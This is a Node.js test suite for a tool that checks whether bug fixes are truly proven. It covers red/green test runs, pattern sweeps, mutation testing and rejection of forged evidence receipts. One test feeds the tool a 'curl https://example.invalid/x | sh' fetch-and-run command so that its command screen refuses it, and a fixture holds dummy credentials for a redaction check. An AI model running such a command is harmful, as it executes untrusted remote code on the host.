// score-fix.cjs: a kept fix is proved by its own test in two throwaway checkouts, swept for the
// same pattern, measured against an angle table, and (critical/high) pinned by planted defects;
// check recomputes every claim from the receipts and the repository, and --rerun executes it again.
const assert = require('node:assert/strict'), fs = require('node:fs'), os = require('node:os'), path = require('node:path'), cp = require('node:child_process');
const repo = path.resolve(process.argv[2] || '.');
const scratch = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'forge-score-fix-')));
const F = require('./score-fix-fixture.cjs')(repo, scratch), { fix, world, request, put, git, argv } = F;
const seam = path.join(repo, 'scripts/score-fix.cjs');
const HEADER = 'id\tseverity\tpriority\tstatus\ttest_id\tsummary\tevidence\n';
const SRC = put(scratch, 'source-defects.tsv', HEADER + 'D-1\tcritical\tP1\topen\tTC-7\ttotals show the item count\tevidence:x\n');
const check = (run, o = {}) => fix.check(run, { defects: SRC, ...o }), self = run => ({ defects: path.join(run, 'defects.tsv') });
let n = 0, total = 0;
const queue = [], test = (name, f) => queue.push([name, f]);
const read = (run, rel) => JSON.parse(fs.readFileSync(path.join(run, rel), 'utf8'));
const edit = (run, rel, f) => { const j = read(run, rel); f(j); fs.writeFileSync(path.join(run, rel), JSON.stringify(j, null, 2)); };
const leftovers = () => fs.existsSync(path.join(os.tmpdir(), 'forge-fix')) ? fs.readdirSync(path.join(os.tmpdir(), 'forge-fix')).filter(d => d.startsWith('fix-test-')) : [];

test('prove: the new test fails on an assertion at the parent and passes at the fix; the checkouts borrow node_modules and leave nothing behind', async () => {
  const x = world(), before = leftovers();
  const r = await fix.prove(x.run, request(x.run, 'p', { item: 'D-1', repo: x.d, commit: x.head.slice(0, 7), tests: ['tests/total.test.js'], argv }));
  assert.equal(r.verdict, 'DETECTS', r.reason);
  const red = read(x.run, 'evidence/D-1-tests-red.json'), green = read(x.run, 'evidence/D-1-tests-green.json');
  assert.deepEqual([red.kind, red.commit, red.fix_commit, red.assertion, red.exit_code !== 0], ['tests-red', x.base, x.head, true, true]);
  assert.deepEqual([green.kind, green.commit, green.exit_code, green.error, green.link, green.copy], ['tests-green', x.head, 0, null, ['node_modules', '.venv', 'venv', 'vendor'], []]);
  assert.match(red.stdout + red.stderr, /sums the amounts/, 'the fix commit\'s test ran against the parent\'s code');
  assert.equal(red.stdout_sha256, require('node:crypto').createHash('sha256').update(red.stdout).digest('hex'));
  assert.ok(fs.existsSync(path.join(x.d, 'node_modules/dep/index.js')), 'the borrowed node_modules survives the checkout\'s removal');
  assert.equal(git(x.d, 'worktree', 'list').trim().split('\n').length, 1, 'no worktree left in the repository');
  assert.deepEqual(leftovers(), before, 'no checkout left in the temp folder');
});
test('prove: a test that passes before the fix, or fails for a missing module, proves nothing', async () => {
  const x = world();
  put(x.d, 'tests/empty.test.js', "require('node:test')('empty list', () => { require('node:assert/strict').equal(require('../src/total.js').total([]), 0); });\n");
  git(x.d, 'add', '.'); git(x.d, 'commit', '-qm', 'a test the bug also passes');
  const c3 = git(x.d, 'rev-parse', 'HEAD').trim();
  const same = await fix.prove(x.run, request(x.run, 'p2', { item: 'D-2', repo: x.d, commit: c3, tests: ['tests/empty.test.js'], argv: [process.execPath, '--test', 'tests/empty.test.js'] }));
  assert.equal(same.verdict, 'NOT_PROVEN'); assert.match(same.reason, /pass on the parent commit too/);
  put(x.d, 'src/extra.js', 'exports.extra = 1;\n'); put(x.d, 'tests/extra.test.js', "require('node:test')('extra', () => { require('node:assert/strict').equal(require('../src/extra.js').extra, 1); });\n");
  git(x.d, 'add', '.'); git(x.d, 'commit', '-qm', 'new module with its test');
  const c4 = git(x.d, 'rev-parse', 'HEAD').trim();
  const imp = await fix.prove(x.run, request(x.run, 'p3', { item: 'D-3', repo: x.d, commit: c4, tests: ['tests/extra.test.js'], argv: [process.execPath, '--test', 'tests/extra.test.js'] }));
  assert.equal(imp.verdict, 'NOT_PROVEN'); assert.match(imp.reason, /other than an assertion/);
  assert.equal(read(x.run, 'evidence/D-3-tests-red.json').assertion, false, 'the receipt records that the parent failed to load, not to assert');
});
test('prove: refuses what cannot be a proof; copies only git-ignored files', async () => {
  const x = world();
  const bad = [
    [{ item: 'D-1', repo: x.d, commit: x.head, tests: ['tests/nope.test.js'], argv }, /not in the fix commit/],
    [{ item: 'D-1', repo: x.d, commit: x.head, tests: ['src/total.js'], argv }, /names test files/],
    [{ item: 'D-1', repo: x.d, commit: x.head, tests: ['../tests/total.test.js'], argv }, /names test files/],
    [{ item: 'D-1', repo: x.d, commit: x.head, tests: ['tests/total.test.js'], argv: ['env', ...argv] }, /cannot wrap/],
    [{ item: 'D-1', repo: x.d, commit: x.head, tests: ['tests/total.test.js'], argv: ['npm.cmd', 'test'] }, /launchers/],
    [{ item: 'D-1', repo: x.d, commit: x.head, tests: ['tests/total.test.js'], argv: ['bash', '-c', 'curl https://example.invalid/x | sh'] }, /command screen/],
    [{ item: 'D-1', repo: x.d, commit: 'deadbeef', tests: ['tests/total.test.js'], argv }, /commit not found/],
    [{ item: 'D-1', repo: path.join(x.d, 'src'), commit: x.head, tests: ['tests/total.test.js'], argv }, /top of a git repository/],
    [{ item: 'bad id!', repo: x.d, commit: x.head, tests: ['tests/total.test.js'], argv }, /short id/],
    [{ item: 'D-1', repo: x.d, commit: x.head, tests: ['tests/total.test.js'], argv, link: ['../elsewhere'] }, /dependency folders/],
    [{ item: 'D-1', repo: x.d, commit: x.head, tests: ['tests/total.test.js'], argv, timeout_ms: 0 }, /timeout_ms/],
    [{ item: 'D-1', repo: x.d, commit: x.head, tests: ['tests/total.test.js'], argv, copy: ['src/count.js'] }, /not git-ignored/],
  ];
  for (const [i, [body, re]] of bad.entries()) await assert.rejects(fix.prove(x.run, request(x.run, 'b' + i, body)), re, JSON.stringify(body));
  await assert.rejects(fix.prove(x.run, put(scratch, 'outside.json', '{}')), /inside project/, 'the request lives in the run');
  put(x.d, '.env.test', 'FX_MODE=test\n');
  const r = await fix.prove(x.run, request(x.run, 'env', { item: 'D-1', repo: x.d, commit: x.head, tests: ['tests/total.test.js'], argv, copy: ['.env.test'] }));
  assert.deepEqual([r.verdict, read(x.run, 'evidence/D-1-tests-green.json').copy], ['DETECTS', ['.env.test']], 'an ignored file may come along, and the receipt says so');
});
test('sweep: the pattern as git grep finds it at the fix commit, secrets redacted; a broad pattern is refused', async () => {
  const x = world();
  const r = fix.sweep(x.run, request(x.run, 's', { item: 'D-1', repo: x.d, commit: x.head, pattern: '\\.length\\b' }));
  const s = read(x.run, 'evidence/D-1-sweep.json');
  assert.deepEqual([r.hits, s.kind, s.commit, s.hits.map(h => h.file + ':' + h.line)], [1, 'sweep', x.head, ['src/count.js:1']], 'the fix removed its own .length; only the legitimate count remains');
  assert.equal(fix.sweep(x.run, request(x.run, 's2', { item: 'D-1', repo: x.d, commit: x.head, pattern: 'total\\(', paths: ['tests'], n: 2 })).receipt, 'evidence/D-1-sweep-2.json');
  assert.throws(() => fix.sweep(x.run, request(x.run, 's3', { item: 'D-1', repo: x.d, commit: x.head, pattern: 'x' })), /matches \d{3,} lines: narrow it/);
  assert.throws(() => fix.sweep(x.run, request(x.run, 's4', { item: 'D-1', repo: x.d, commit: x.head, pattern: 'x'.repeat(201) })), /at most 200/);
  put(x.d, 'src/config.js', "exports.dsn = 'postgres://admin:Sup3rSecretPw@db.internal/app'; // password=hunter2\n"); git(x.d, 'add', '.'); git(x.d, 'commit', '-qm', 'config');
  const c = git(x.d, 'rev-parse', 'HEAD').trim();
  process.env.FX_TEST_TOKEN = 'hunter2hunter2';
  try { fix.sweep(x.run, request(x.run, 's5', { item: 'D-1', repo: x.d, commit: c, pattern: 'password|postgres://', n: 3 })); } finally { delete process.env.FX_TEST_TOKEN; }
  const text = JSON.stringify(read(x.run, 'evidence/D-1-sweep-3.json').hits);
  assert.ok(!/Sup3rSecretPw|hunter2/.test(text) && /REDACTED/.test(text), 'a matched line never carries a credential into the run: ' + text);
});
test('mutate: planted defects the tests catch are killed; one they miss survives; nonsense is invalid; tests and untouched files are refused', async () => {
  const x = world();
  const r = await fix.mutate(x.run, request(x.run, 'm', { item: 'D-1', repo: x.d, commit: x.head, argv, mutants: [
    { name: 'seed of one', file: 'src/total.js', find: 'a + b, 0)', replace: 'a + b, 1)' },
    { name: 'guard dropped', file: 'src/total.js', find: 'if (!Array.isArray(xs))', replace: 'if (false)' },
    { name: 'message punctuation', file: 'src/total.js', find: "'list required'", replace: "'list required!'" },
    { name: 'absent', file: 'src/total.js', find: 'nothing like this', replace: 'x' },
    { name: 'broken syntax', file: 'src/total.js', find: 'return xs', replace: 'return xs ((' }] }));
  assert.deepEqual([r.killed, r.valid, r.survived, r.invalid.length], [2, 3, ['message punctuation'], 2]);
  const m = read(x.run, 'evidence/D-1-mutants.json');
  assert.deepEqual(m.mutants.map(z => z.status), ['killed', 'killed', 'survived', 'invalid', 'invalid']);
  assert.match(m.mutants[4].reason, /does not compile/);
  assert.equal(git(x.d, 'show', `${x.head}:src/total.js`), F.FIXED, 'the repository is untouched');
  assert.equal(git(x.d, 'worktree', 'list').trim().split('\n').length, 1);
  await assert.rejects(fix.mutate(x.run, request(x.run, 'mt', { item: 'D-1', repo: x.d, commit: x.head, argv, mutants: [{ name: 'expected value', file: 'tests/total.test.js', find: '6', replace: '7' }] })), /never in a test/);
  await assert.rejects(fix.mutate(x.run, request(x.run, 'mu', { item: 'D-1', repo: x.d, commit: x.head, argv, mutants: [{ name: 'elsewhere', file: 'src/count.js', find: 'length', replace: 'size' }] })), /source lines the fix changed/);
});
test('angles: the table is checked row by row', async () => {
  const x = world();
  put(x.run, 'angles.tsv', 'item\tdimension\ttechnique\tstatus\ttest_id\texpected\treason\n' + F.angles('D-1'));
  assert.deepEqual([fix.angles(x.run).valid, fix.angles(x.run).rows], [true, 12]);
  const bad = {
    'an invented dimension': 'D-1\tvibes\tscenario\ttested\tt\tx\t',
    'a tested angle without its test': 'D-1\tdata\tboundary\ttested\t\tTypeError\t',
    '"no crash" as the expected outcome': 'D-1\tsecurity\terror-guessing\ttested\tt\tno server error\t',
    '"200" as the expected outcome': 'D-1\tsecurity\terror-guessing\ttested\tt\t200\t',
    '"returns 200 OK" as the expected outcome': 'D-1\tsecurity\terror-guessing\ttested\tt\treturns 200 OK\t',
    '"does not fail" as the expected outcome': 'D-1\tsecurity\terror-guessing\ttested\tt\tdoes not fail\t',
    'n/a without a reason': 'D-1\tscale\t-\tn/a\t\t\t',
    'an unknown technique': 'D-1\tdata\tguessing\ttested\tt\tTypeError\t',
    'an unknown status': 'D-1\tdata\tboundary\tmaybe\tt\tTypeError\t',
  };
  for (const [name, row] of Object.entries(bad)) { put(x.run, 'angles.tsv', 'item\tdimension\ttechnique\tstatus\ttest_id\texpected\treason\n' + row + '\n'); assert.equal(fix.angles(x.run).valid, false, name); }
  for (const ok of ['401 and "token expired"', 'TypeError "list required"', '409 for the loser, the first hold kept']) assert.equal(fix.NO_CRASH.test(ok), false, ok);
});
test('check: a run with a proved, swept, angled and mutation-pinned critical fix is VALID, pinned to its repository and source ledger', async () => {
  const run = await F.valid(), r = await check(run);
  assert.deepEqual([r.valid, r.errors, r.gaps], [true, [], []]);
  assert.deepEqual(r.stats, { items: 1, proved: 1, exempt: 0, angles: 12, hits: 1, killed: 3, valid: 3, reran: 0 });
  assert.equal(r.repo, fs.realpathSync(path.resolve(run, '..', '..')).replace(/\\/g, '/'), 'the repository is the one the run lives in');
  const unpinned = await fix.check(run);
  assert.deepEqual([unpinned.valid, unpinned.gaps.length], [true, 1]); assert.match(unpinned.gaps[0], /--defects/);
  const cli = cp.spawnSync(process.execPath, [seam, 'check', run, '--defects', SRC], { encoding: 'utf8' });
  assert.equal(cli.status, 0, cli.stdout + cli.stderr); assert.match(cli.stdout, /^FIX_EVIDENCE: VALID items=1 proved=1 .* repo=\S+/);
});
test('check: every way the run can be short of its evidence is INVALID, and says which', async () => {
  const bad = {
    'no tests.tsv': run => fs.unlinkSync(path.join(run, 'tests.tsv')),
    'a kept fix without a row': run => put(run, 'tests.tsv', 'item\tcategory\ttests\tmutation\treason\n'),
    'a row for an item nobody fixed': run => fs.appendFileSync(path.join(run, 'tests.tsv'), 'D-9\tproved\tt\trequired\t\n'),
    'receipt output edited': run => edit(run, 'evidence/D-1-tests-red.json', j => { j.stdout += ' '; }),
    'red run not at the parent': run => edit(run, 'evidence/D-1-tests-red.json', j => { j.commit = j.fix_commit; }),
    'red run passed': run => edit(run, 'evidence/D-1-tests-red.json', j => { j.exit_code = 0; }),
    'red failure was a load error': run => edit(run, 'evidence/D-1-tests-red.json', j => { j.assertion = false; }),
    'green run failed': run => edit(run, 'evidence/D-1-tests-green.json', j => { j.exit_code = 1; }),
    'receipts for another commit': run => { for (const k of ['red', 'green']) edit(run, `evidence/D-1-tests-${k}.json`, j => { j.fix_commit = 'a'.repeat(40); }); },
    'test changed after the proof': run => { for (const k of ['red', 'green']) edit(run, `evidence/D-1-tests-${k}.json`, j => { j.tests_sha256['tests/total.test.js'] = 'b'.repeat(64); }); },
    'red and green ran different tests': run => edit(run, 'evidence/D-1-tests-green.json', j => { j.tests = ['tests/base.test.js']; }),
    'a receipt from another run': run => edit(run, 'evidence/D-1-tests-green.json', j => { j.run = 'fix-other'; }),
    'a hand-written receipt': run => put(run, 'evidence/D-1-tests-green.json', JSON.stringify({ kind: 'tests-green', exit_code: 0 })),
    'receipts proved in another repository': run => { for (const k of ['red', 'green']) edit(run, `evidence/D-1-tests-${k}.json`, j => { j.repo = j.repo + '-decoy'; }); },
    'a hostile receipt shape': run => edit(run, 'evidence/D-1-tests-red.json', j => { j.tests = 5; }),
    'an unknown iteration status': run => put(run, 'iterations.tsv', fs.readFileSync(path.join(run, 'iterations.tsv'), 'utf8').replace('\tkeep\t', '\tkept\t')),
    'a severity lowered against the source ledger': run => put(run, 'defects.tsv', fs.readFileSync(path.join(run, 'defects.tsv'), 'utf8').replace('critical', 'low')),
    'an angle missing for a critical defect': run => put(run, 'angles.tsv', fs.readFileSync(path.join(run, 'angles.tsv'), 'utf8').split('\n').filter(l => !l.includes('\tconcurrency\t')).join('\n')),
    'an expected outcome that only says nothing crashed': run => put(run, 'angles.tsv', fs.readFileSync(path.join(run, 'angles.tsv'), 'utf8').replace('TypeError "list required"\t', 'does not crash\t')),
    'a sweep hit without a disposition': run => put(run, 'sweep.tsv', 'item\tfile\tline\tdisposition\treference\n'),
    'an invented sweep row': run => fs.appendFileSync(path.join(run, 'sweep.tsv'), 'D-1\tsrc/other.js\t9\tnot-affected\tx\n'),
    'fixed-here on a file the fix never touched': run => put(run, 'sweep.tsv', 'item\tfile\tline\tdisposition\treference\nD-1\tsrc/count.js\t1\tfixed-here\t\n'),
    'new-defect naming no defect': run => put(run, 'sweep.tsv', 'item\tfile\tline\tdisposition\treference\nD-1\tsrc/count.js\t1\tnew-defect\tD-77\n'),
    'new-defect naming the item itself': run => put(run, 'sweep.tsv', 'item\tfile\tline\tdisposition\treference\nD-1\tsrc/count.js\t1\tnew-defect\tD-1\n'),
    'new-defect naming a rejected defect': run => { fs.appendFileSync(path.join(run, 'defects.tsv'), 'D-2\tlow\tP4\trejected\tTC-9\tx\t\n'); put(run, 'sweep.tsv', 'item\tfile\tline\tdisposition\treference\nD-1\tsrc/count.js\t1\tnew-defect\tD-2\n'); },
    'not-affected without a reason': run => put(run, 'sweep.tsv', 'item\tfile\tline\tdisposition\treference\nD-1\tsrc/count.js\t1\tnot-affected\t\n'),
    'no sweep at all': run => { fs.unlinkSync(path.join(run, 'evidence/D-1-sweep.json')); },
    'a sweep with hostile hits': run => edit(run, 'evidence/D-1-sweep.json', j => { j.hits = [null]; }),
    'mutation required but not done': run => fs.unlinkSync(path.join(run, 'evidence/D-1-mutants.json')),
    'a surviving mutant': run => edit(run, 'evidence/D-1-mutants.json', j => { j.mutants[0].status = 'survived'; }),
    'a mutant status that is not one': run => edit(run, 'evidence/D-1-mutants.json', j => { j.mutants[0].status = 'whatever'; }),
    'mutants planted in the test file': run => edit(run, 'evidence/D-1-mutants.json', j => { for (const m of j.mutants) m.file = 'tests/total.test.js'; }),
    'too few mutants': run => edit(run, 'evidence/D-1-mutants.json', j => { j.mutants = j.mutants.slice(0, 2); }),
    'mutants run with another command': run => edit(run, 'evidence/D-1-mutants.json', j => { j.argv = ['true']; }),
    'a critical defect excused as a type error': run => put(run, 'tests.tsv', 'item\tcategory\ttests\tmutation\treason\nD-1\ttype\t\t\tthe compiler is the test\n'),
    'an exemption without a reason': run => put(run, 'tests.tsv', 'item\tcategory\ttests\tmutation\treason\nD-1\tno-runner\t\t\t\n'),
    'an unknown category': run => put(run, 'tests.tsv', 'item\tcategory\ttests\tmutation\treason\nD-1\tvibes\t\t\t\n'),
    'a kept fix without its commit': run => put(run, 'iterations.tsv', fs.readFileSync(path.join(run, 'iterations.tsv'), 'utf8').replace(/\t[0-9a-f]{7}\t0\t-1/, '\t-\t0\t-1')),
    'evidence borrowed from a longer item id': (run, x) => {
      for (const id of ['E-1', 'E-10']) { fs.appendFileSync(path.join(run, 'iterations.tsv'), `2\tt\t${id}\tx\t${x.head.slice(0, 7)}\t0\t-1\tpass\tkeep\ttsc\n`); fs.appendFileSync(path.join(run, 'tests.tsv'), `${id}\ttype\t\t\ttsc is the check\n`); }
      put(run, 'evidence/e-10-red.txt', 'x'); put(run, 'evidence/e-10-green.txt', 'ok');
    },
  };
  for (const [name, change] of Object.entries(bad)) {
    const run = await F.gamed(change), r = await check(run);
    assert.equal(r.valid, false, name + ' was accepted');
    assert.ok(r.errors.length > 0 && r.errors.every(e => typeof e === 'string' && e.length > 10), name + ' gives no reason');
  }
});
test('check: the ledger copy is read on its own terms — a fixed row needs a kept fix, a severity needs its spelling', async () => {
  const orphan = await F.gamed(run => fs.appendFileSync(path.join(run, 'defects.tsv'), 'D-2\thigh\tP1\tfixed\tTC-8\tx\tevidence:x\n'));
  let r = await check(orphan, self(orphan));
  assert.deepEqual([r.valid, r.errors], [false, ['defects.tsv: D-2 is fixed but no kept fix of iterations.tsv names it']], 'the only reason is the orphan row');
  const spelt = await F.gamed(run => put(run, 'defects.tsv', fs.readFileSync(path.join(run, 'defects.tsv'), 'utf8').replace('critical', 'Critical')));
  r = await check(spelt, self(spelt));
  assert.equal(r.valid, false); assert.match(r.errors[0], /severity "Critical" is not one of critical, high, medium, low/);
});
test('check: receipts honestly produced in a decoy repository do not count for this one', async () => {
  const run = await F.valid(), decoy = world();
  const p = await fix.prove(decoy.run, request(decoy.run, 'p', { item: 'D-1', repo: decoy.d, commit: decoy.head, tests: ['tests/total.test.js'], argv }));
  assert.equal(p.verdict, 'DETECTS');
  for (const k of ['red', 'green']) fs.copyFileSync(path.join(decoy.run, `evidence/D-1-tests-${k}.json`), path.join(run, `evidence/D-1-tests-${k}.json`));
  const r = await check(run);
  assert.equal(r.valid, false); assert.match(r.errors.join('\n'), /proved in .*-decoy|proved in .*repo-.*, not in this run's repository/);
  const outside = fs.mkdtempSync(path.join(scratch, 'loose-')); fs.cpSync(run, path.join(outside, 'fix-test'), { recursive: true });
  const loose = await check(path.join(outside, 'fix-test'));
  assert.equal(loose.valid, false); assert.match(loose.errors[0], /not inside one and --repo was not given/);
  const named = await check(path.join(outside, 'fix-test'), { repo: path.resolve(run, '..', '..') });
  assert.equal(named.valid, false, 'the decoy receipts still name the wrong repository');
});
test('check: exemptions, depth by severity and error-mode items', async () => {
  const noRunner = await F.gamed(run => put(run, 'tests.tsv', 'item\tcategory\ttests\tmutation\treason\nD-1\tno-runner\t\t\tthe project has no test framework; probe in evidence/\n'));
  let r = await check(noRunner); assert.deepEqual([r.valid, r.gaps.length], [true, 1], r.errors.join('; ')); assert.match(r.gaps[0], /no test runner/);
  const waived = await F.gamed(run => { fs.unlinkSync(path.join(run, 'evidence/D-1-mutants.json')); put(run, 'tests.tsv', 'item\tcategory\ttests\tmutation\treason\nD-1\tproved\ttests/total.test.js\tn/a: the fix is a one-line config change\t\n'); });
  r = await check(waived); assert.deepEqual([r.valid, r.gaps.length], [true, 1], r.errors.join('; ')); assert.match(r.gaps[0], /without mutation evidence/);
  const medium = await F.gamed(run => { put(run, 'defects.tsv', HEADER + 'D-1\tmedium\tP3\tfixed\tTC-7\ts\tevidence:x\n'); put(run, 'angles.tsv', 'item\tdimension\ttechnique\tstatus\ttest_id\texpected\treason\n' + F.angles('D-1').split('\n').filter(l => /\t(?:validation|data)\t/.test(l)).join('\n') + '\n'); fs.unlinkSync(path.join(run, 'evidence/D-1-mutants.json')); });
  r = await check(medium, self(medium)); assert.deepEqual([r.valid, r.errors], [true, []], 'medium: inputs and boundaries, no mutation');
  const thin = await F.gamed(run => { put(run, 'defects.tsv', HEADER + 'D-1\tmedium\tP3\tfixed\tTC-7\ts\tevidence:x\n'); put(run, 'angles.tsv', 'item\tdimension\ttechnique\tstatus\ttest_id\texpected\treason\n'); });
  r = await check(thin, self(thin)); assert.equal(r.valid, false); assert.match(r.errors.join('\n'), /needs the validation angle/);
  const errorMode = await F.gamed((run, x) => {
    fs.appendFileSync(path.join(run, 'iterations.tsv'), `2\tt\tE-1\tmissing return type\t${x.head.slice(0, 7)}\t0\t-1\tpass\tkeep\ttsc\n`);
    fs.appendFileSync(path.join(run, 'tests.tsv'), 'E-1\ttype\t\t\ttsc --noEmit is the check\n');
    put(run, 'evidence/e-1-red.txt', 'error TS7010\n'); put(run, 'evidence/e-1-green.txt', 'ok\n');
  });
  r = await check(errorMode); assert.deepEqual([r.valid, r.stats.exempt], [true, 1], r.errors.join('; '));
  const noEvidence = await F.gamed((run, x) => { fs.appendFileSync(path.join(run, 'iterations.tsv'), `2\tt\tE-1\tx\t${x.head.slice(0, 7)}\t0\t-1\tpass\tkeep\ttsc\n`); fs.appendFileSync(path.join(run, 'tests.tsv'), 'E-1\ttype\t\t\twhy\n'); });
  assert.equal((await check(noEvidence)).valid, false, 'an exemption still needs the red and green of the error it removed');
  const feature = await F.gamed(run => put(run, 'tests.tsv', 'item\tcategory\ttests\tmutation\treason\nD-1\tnew-behaviour\t\t\tnothing existed to fail against\n'));
  r = await check(feature); assert.deepEqual([r.valid, r.gaps.length], [true, 1]); assert.match(r.gaps[0], /re-engagement tests it/);
  const composite = await F.gamed(run => { put(run, 'iterations.tsv', fs.readFileSync(path.join(run, 'iterations.tsv'), 'utf8').replace('\tD-1\t', '\tD-1+D-2\t')); fs.appendFileSync(path.join(run, 'defects.tsv'), 'D-2\tlow\tP4\tfixed\tTC-9\tx\tevidence:x\n'); for (const f of ['tests.tsv', 'angles.tsv', 'sweep.tsv']) put(run, f, fs.readFileSync(path.join(run, f), 'utf8').replace(/^D-1\t/gm, 'D-1+D-2\t')); for (const k of ['tests-red', 'tests-green', 'sweep', 'mutants']) { edit(run, `evidence/D-1-${k}.json`, j => { j.item = 'D-1+D-2'; }); fs.renameSync(path.join(run, `evidence/D-1-${k}.json`), path.join(run, `evidence/D-1+D-2-${k}.json`)); } });
  r = await check(composite, self(composite)); assert.deepEqual([r.valid, r.errors], [true, []], 'one fix may close several ledger ids; the highest severity rules');
});
test('check: a test that existed before the fix is accepted and flagged for the re-engagement', async () => {
  const run = await F.gamed(async (r, x) => {
    put(x.d, 'src/total.js', F.FIXED.replace('a + b, 0', 'a + b, 0 /* same */')); git(x.d, 'add', '.'); git(x.d, 'commit', '-qm', 'comment');
  });
  const d = path.resolve(run, '..', '..');
  put(d, 'src/total.js', F.BUG); git(d, 'add', '.'); git(d, 'commit', '-qm', 'regress'); put(d, 'src/total.js', F.FIXED); git(d, 'add', '.'); git(d, 'commit', '-qm', 'fix again: D-2');
  const again = git(d, 'rev-parse', 'HEAD').trim();
  fs.appendFileSync(path.join(run, 'iterations.tsv'), `2\tt\tD-2\tregressed\t${again.slice(0, 7)}\t0\t0\tpass\tkeep\tfix again\n`);
  fs.appendFileSync(path.join(run, 'defects.tsv'), 'D-2\tlow\tP4\tfixed\tTC-8\tregressed\tevidence:x\n');
  const p = await fix.prove(run, request(run, 'D-2-prove', { item: 'D-2', repo: d, commit: again, tests: ['tests/total.test.js'], argv }));
  assert.equal(p.verdict, 'DETECTS', p.reason);
  fix.sweep(run, request(run, 'D-2-sweep', { item: 'D-2', repo: d, commit: again, pattern: 'never-matches-anything' }));
  fs.appendFileSync(path.join(run, 'tests.tsv'), 'D-2\tproved\ttests/total.test.js\trequired\t\n');
  const r = await check(run, self(run));
  assert.deepEqual([r.valid, r.errors], [true, []]); assert.match(r.gaps.join('\n'), /existed before the fix/);
});
test('check --rerun: the proofs are executed again, so a receipt that lies about its exit code is caught', async () => {
  const run = await F.gamed(async (r, x) => {
    put(x.d, 'tests/empty.test.js', "require('node:test')('empty list', () => { require('node:assert/strict').equal(require('../src/total.js').total([]), 0); });\n");
    git(x.d, 'add', '.'); git(x.d, 'commit', '-qm', 'a test the bug also passes');
  });
  const d = path.resolve(run, '..', '..'), c3 = git(d, 'rev-parse', 'HEAD').trim(), argv3 = [process.execPath, '--test', 'tests/empty.test.js'];
  fs.appendFileSync(path.join(run, 'iterations.tsv'), `2\tt\tD-2\tempty list\t${c3.slice(0, 7)}\t0\t0\tpass\tkeep\tempty\n`);
  fs.appendFileSync(path.join(run, 'defects.tsv'), 'D-2\tlow\tP4\tfixed\tTC-8\tempty\tevidence:x\n');
  fs.appendFileSync(path.join(run, 'tests.tsv'), 'D-2\tproved\ttests/empty.test.js\trequired\t\n');
  const honest = await fix.prove(run, request(run, 'D-2-prove', { item: 'D-2', repo: d, commit: c3, tests: ['tests/empty.test.js'], argv: argv3 }));
  assert.equal(honest.verdict, 'NOT_PROVEN');
  fix.sweep(run, request(run, 'D-2-sweep', { item: 'D-2', repo: d, commit: c3, pattern: 'never-matches-anything' }));
  edit(run, 'evidence/D-2-tests-red.json', j => { j.exit_code = 1; j.assertion = true; });
  const paper = await check(run, self(run));
  assert.deepEqual([paper.valid, paper.errors], [true, []], 'on paper the lie holds: exit codes are not hashed');
  const real = await check(run, { ...self(run), rerun: true });
  assert.equal(real.valid, false); assert.match(real.errors.join('\n'), /D-2: re-running the proof disagrees .* pass on the parent commit too/);
  assert.equal(real.stats.reran, 2, 'both proved items ran again');
  const cli = cp.spawnSync(process.execPath, [seam, 'check', run, '--rerun', '--defects', path.join(run, 'defects.tsv')], { encoding: 'utf8' });
  assert.equal(cli.status, 1); assert.match(cli.stdout, /^FIX_EVIDENCE: INVALID\n/);
  const truthful = await F.valid(), re = await check(truthful, { rerun: true });
  assert.deepEqual([re.valid, re.stats.reran, re.errors], [true, 1, []], 'a real proof survives being run again');
});
test('CLI: prove, sweep, mutate and angles speak in one line and exit codes', async () => {
  const x = world();
  const run = (...args) => cp.spawnSync(process.execPath, [seam, ...args], { encoding: 'utf8' });
  const p = run('prove', x.run, request(x.run, 'p', { item: 'D-1', repo: x.d, commit: x.head, tests: ['tests/total.test.js'], argv }));
  assert.equal(p.status, 0, p.stderr); assert.match(p.stdout, /^PROVE: DETECTS D-1 — 1 test file\(s\) fail at [0-9a-f]{8}, pass at [0-9a-f]{8}/);
  const s = run('sweep', x.run, request(x.run, 's', { item: 'D-1', repo: x.d, commit: x.head, pattern: '\\.length\\b' }));
  assert.equal(s.status, 0); assert.match(s.stdout, /^SWEEP: 1 hit\(s\) for D-1 in evidence\/D-1-sweep\.json/);
  const m = run('mutate', x.run, request(x.run, 'm', { item: 'D-1', repo: x.d, commit: x.head, argv, mutants: [{ name: 'punctuation', file: 'src/total.js', find: "'list required'", replace: "'list required!'" }] }));
  assert.equal(m.status, 1); assert.match(m.stdout, /^MUTATION: 0\/1 killed for D-1 — survived: punctuation/);
  put(x.run, 'angles.tsv', 'item\tdimension\ttechnique\tstatus\ttest_id\texpected\treason\nD-1\tvibes\t-\tn/a\t\t\tx\n');
  const an = run('angles', x.run); assert.equal(an.status, 1); assert.match(an.stdout, /^ANGLES: INVALID\n  angles.tsv line 2: dimension/);
  assert.equal(run('check', path.join(scratch, 'nowhere')).status, 2, 'a missing run is blocked, not judged');
  assert.equal(run('nonsense', x.run).status, 2);
});

(async () => {
  for (const [name, f] of queue) {
    total++;
    try { await f(); n++; console.error('PASS: ' + name); } catch (e) { console.error('FAIL: ' + name + ': ' + (e.stack || e.message)); }
  }
  try { fs.rmSync(scratch, { recursive: true, force: true, maxRetries: 5, retryDelay: 200 }); } catch { /* a process still closing */ }
  console.log(n + '/' + total + ' score-fix checks passed');
  if (n !== total) process.exitCode = 1;
})();
